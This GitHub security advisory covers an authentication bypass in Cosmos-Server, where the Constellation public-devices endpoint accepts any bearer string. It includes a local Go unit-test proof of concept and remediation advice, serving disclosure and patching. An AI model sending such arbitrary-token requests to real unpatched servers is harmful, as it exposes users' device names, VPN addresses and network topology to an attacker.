# [M] Cosmos-Server's constellation public-devices endpoint accepts arbitrary bearer tokens

## Summary
Severity: Medium
Advisory: GHSA-5fqm-cc34-fcf5
CVE: CVE-2026-49447
CWE: CWE-287
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N (CVSS_V3)
Published: 2026-07-28
Source: https://github.com/advisories/GHSA-5fqm-cc34-fcf5
Type: github-advisory

## Affected
- Go: `github.com/azukaar/cosmos-server` — affected >=0.22.18 <0.22.19

## Details
### Summary
`GET /cosmos/api/constellation/public-devices` discloses Constellation device metadata to a requester that supplies any non-empty `Authorization` header. The handler strips the string `Bearer ` from the header but never validates the resulting token and never uses it in the database query.

This was confirmed locally by routing a request through the real `tokenMiddleware` with `Authorization: Bearer not-a-real-token`. The request returned public Constellation device metadata from a disposable fixture. A missing-header negative control returned `401 Unauthorized`, proving the bypass is specifically the acceptance of arbitrary bearer values.

### Details
Source-to-sink path:

- `src/httpServer.go:690` registers `/api/constellation/public-devices` on the authenticated admin API router.
- `src/httpServer.go:815-817` applies `SecureAPI(..., public=false, ...)`, which runs `tokenMiddleware`.
- `src/httpServer.go:231-237` only treats `Authorization: Bearer cosmos_...` as a Cosmos API token for validation. Other bearer strings are not validated by the middleware and fall through to the handler.
- `src/constellation/api_devices_public.go:42-47` checks only that the `Authorization` header is present.
- `src/constellation/api_devices_public.go:49-50` strips `Bearer ` but does not verify the token or compare it with a device/API key.
- `src/constellation/api_devices_public.go:63-67` queries all non-blocked and non-invisible devices without including the stripped auth value in the filter.
- `src/constellation/api_devices_public.go:84-99` returns device names, user nicknames, cleaned VPN/internal IPs, role flags, public hostname, and port.

The handler does not call `utils.CheckPermissions`, `utils.CheckPermissionsOrSelf`, the Cosmos API-token permission check, or any Constellation-token validation before returning the data.

Default/common exposure evidence:

- The route is registered in the standard server setup (`src/httpServer.go:690`).
- Constellation is a documented product feature described as the VPN used to securely access applications remotely (`readme.md:49`).
- The default config ships Constellation disabled (`src/utils/utils.go:104-105`), so impact requires a deployment that enables the Constellation/VPN feature and has at least one non-blocked, non-invisible device.
- The root package identifies the product as `cosmos-server` version `0.22.18` (`package.json:1-2`).
- The Go module is `github.com/azukaar/cosmos-server` (`go.mod:0`).

False-positive screen:

- The PoC wraps the handler in the same `tokenMiddleware` used by `SecureAPI`, so it tests the deployed middleware behavior rather than directly calling the handler alone.
- A request with no `Authorization` header returns `401 Unauthorized`.
- A request with `Authorization: Bearer not-a-real-token` returns `200 OK` and device metadata.
- The fixture data is stored in a disposable embedded database under `t.TempDir()` and no external services are contacted.
- The route is not protected by handler-level `CheckPermissions`, and the arbitrary bearer value is not used by the database query.

Candidate score: 13/18. Reachability 1, attacker control 2, privilege required 2, sink impact 1, mitigation weakness 2, default exposure 1, safe PoC feasibility 2, static certainty 2, false-positive resistance 2. The lower score reflects that Constellation is disabled in the shipped default config, but it is a documented/common product feature.

Exploitability gate: confirmed for deployments with Constellation enabled and populated with devices. The reachable source, arbitrary-token bypass, data-disclosure impact, safe local reproduction, and affected-version evidence are present. Default exposure is feature-dependent rather than enabled in a fresh default config.

### PoC
Clean-checkout maintainer recipe:

1. Check out commit `88de73dcca50172393a75de0e4dc3ab93622825c` or version `0.22.18`.
2. Create `src/zz_security_poc_test.go` with the following test.
3. Run `go test ./src -run TestAuditPublicDevicesAllowsArbitraryBearer -count=1 -v`.
4. Delete `src/zz_security_poc_test.go` after confirming.

```go
package main

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/azukaar/cosmos-server/src/constellation"
	"github.com/azukaar/cosmos-server/src/utils"
)

func TestAuditPublicDevicesAllowsArbitraryBearer(t *testing.T) {
	oldConfig := utils.MainConfig
	oldBaseConfig := utils.BaseMainConfig
	oldPush := utils.PushShieldMetrics
	oldConfigFolder := utils.CONFIGFOLDER
	defer func() {
		utils.MainConfig = oldConfig
		utils.BaseMainConfig = oldBaseConfig
		utils.PushShieldMetrics = oldPush
		utils.CONFIGFOLDER = oldConfigFolder
		utils.CloseEmbeddedDB()
	}()

	utils.PushShieldMetrics = func(string) {}
	utils.MainConfig = utils.DefaultConfig
	utils.MainConfig.NewInstall = false
	utils.MainConfig.HTTPConfig.Hostname = "example.test"
	utils.BaseMainConfig = utils.MainConfig
	tmp := t.TempDir()
	utils.CONFIGFOLDER = tmp + "/"
	utils.CloseEmbeddedDB()
	c, closeDb, err := utils.GetEmbeddedCollection(utils.GetRootAppId(), "devices")
	defer closeDb()
	if err != nil {
		t.Fatalf("embedded collection: %v", err)
	}
	_, err = c.InsertOne(nil, utils.ConstellationDevice{
		Nickname:       "victim-user",
		DeviceName:     "private-node",
		IP:             "10.8.0.42/24",
		IsLighthouse:   true,
		PublicHostname: "vpn.example.test",
		Port:           "4242",
		Blocked:        false,
		Invisible:      false,
	})
	if err != nil {
		t.Fatalf("insert device fixture: %v", err)
	}

	handler := tokenMiddleware(http.HandlerFunc(constellation.DevicePublicList))
	noAuthReq := httptest.NewRequest(http.MethodGet, "/cosmos/api/constellation/public-devices", nil)
	noAuthRec := httptest.NewRecorder()
	handler.ServeHTTP(noAuthRec, noAuthReq)
	if noAuthRec.Code != http.StatusUnauthorized {
		t.Fatalf("missing Authorization status = %d body = %s", noAuthRec.Code, noAuthRec.Body.String())
	}

	req := httptest.NewRequest(http.MethodGet, "/cosmos/api/constellation/public-devices", nil)
	req.Header.Set("Authorization", "Bearer not-a-real-token")
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("DevicePublicList status = %d body = %s", rec.Code, rec.Body.String())
	}

	var body struct {
		Status string `json:"status"`
		Data []struct {
			Name string `json:"name"`
			User string `json:"user"`
			IP string `json:"ip"`
			PublicHostname string `json:"publicHostname"`
		} `json:"data"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &body); err != nil {
		t.Fatalf("response JSON: %v", err)
	}
	if body.Status != "OK" || len(body.Data) != 1 {
		t.Fatalf("unexpected response body: %s", rec.Body.String())
	}
	if body.Data[0].Name != "private-node" || body.Data[0].User != "victim-user" || body.Data[0].IP != "10.8.0.42" || body.Data[0].PublicHostname != "vpn.example.test" {
		t.Fatalf("unexpected device disclosure: %+v", body.Data[0])
	}
}
```

Observed output in this environment:

```text
=== RUN   TestAuditPublicDevicesAllowsArbitraryBearer
2026/05/24 15:18:09 NOTICE: [INFO] DevicePublicList: Fetching devices with API key
--- PASS: TestAuditPublicDevicesAllowsArbitraryBearer (0.00s)
PASS
ok  	github.com/azukaar/cosmos-server/src	0.057s
```

Control/negative case: the same test first sends the request without `Authorization` and expects `401 Unauthorized`. The subsequent `Authorization: Bearer not-a-real-token` request succeeds and returns the fixture, proving the bypass is not an intentionally unauthenticated endpoint but an unvalidated-header check.

### Impact
An unauthenticated network attacker can enumerate Constellation device metadata from deployments that enable the Constellation/VPN feature and have visible devices. The response exposes device names, user nicknames, internal/VPN IP addresses, node roles such as lighthouse/relay/exit-node flags, public hostnames, and ports. This information can reveal private network topology and user/device inventory and can support targeted follow-on attacks against the VPN or exposed nodes.

The issue does not require a valid Cosmos session, valid Cosmos API token, valid Constellation token, or user interaction; any arbitrary non-empty bearer string is accepted.

### Suggested remediation
Replace the header-presence check with real authorization. Depending on the intended trust model, the handler should require one of:

- a valid Cosmos user/API token with an appropriate permission such as `PERM_RESOURCES_READ` or `PERM_CONFIGURATION_READ`, or
- a dedicated Constellation device/API token that is cryptographically verified and used to scope the query to devices the caller is allowed to see.

Also add regression tests for:

- missing `Authorization` header returns 401,
- malformed/arbitrary bearer token returns 401,
- invalid `cosmos_` API token returns 401 through middleware,
- valid but underprivileged token is rejected,
- valid authorized token returns only permitted devices.

### Credits
- Thai Son Dinh from VinSOC Labs (R&D)
- Nguyen Huy Vu Dung from VinSOC Labs (AppSec)

## References
- https://github.com/azukaar/Cosmos-Server/security/advisories/GHSA-5fqm-cc34-fcf5
- https://github.com/azukaar/Cosmos-Server/commit/59c561d686c8f9843b3e092b50f6346c481d8bbf
- https://github.com/azukaar/Cosmos-Server
- https://github.com/azukaar/Cosmos-Server/releases/tag/v0.22.19
